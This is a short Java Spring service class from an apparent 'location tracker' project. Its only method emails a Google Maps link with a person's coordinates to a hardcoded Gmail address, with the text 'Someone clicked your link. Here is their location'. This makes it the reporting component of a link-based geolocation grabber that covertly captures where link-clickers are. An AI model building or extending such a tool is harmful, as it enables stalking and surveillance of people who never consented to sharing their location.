package com.example.locationtracker;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

@Service
public class EmailService {

	private final JavaMailSender mailSender;

	@Value("${spring.mail.username}")
	private String myEmail;

	public EmailService(JavaMailSender mailSender) {
		this.mailSender = mailSender;
	}

	public void sendLocationEmail(String latitude, String longitude) {
		String mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

		SimpleMailMessage message = new SimpleMailMessage();
		message.setFrom(myEmail);
		message.setTo("ranu97096@gmail.com");
		message.setSubject("New Location Alert!");
		message.setText("Someone clicked your link. Here is their location:\n\n" + mapsLink);

		mailSender.send(message);
	}
}
